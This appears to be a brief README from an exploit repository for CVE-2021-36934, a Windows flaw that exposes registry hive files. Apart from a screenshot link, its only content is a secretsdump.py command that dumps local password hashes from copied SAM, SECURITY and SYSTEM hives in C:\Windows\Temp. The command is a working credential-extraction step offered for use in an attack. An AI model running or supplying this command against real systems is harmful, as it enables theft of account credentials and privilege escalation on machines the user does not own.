# CVE-2021-36934
![Screenshot](https://github.com/0x0D1n/CVE-2021-36934/blob/master/screenshot.PNG)

```
python secretsdump.py -sam C:\Windows\Temp\SAM -security C:\Windows\Temp\SECURITY -system C:\Windows\Temp\SYSTEM LOCAL
```

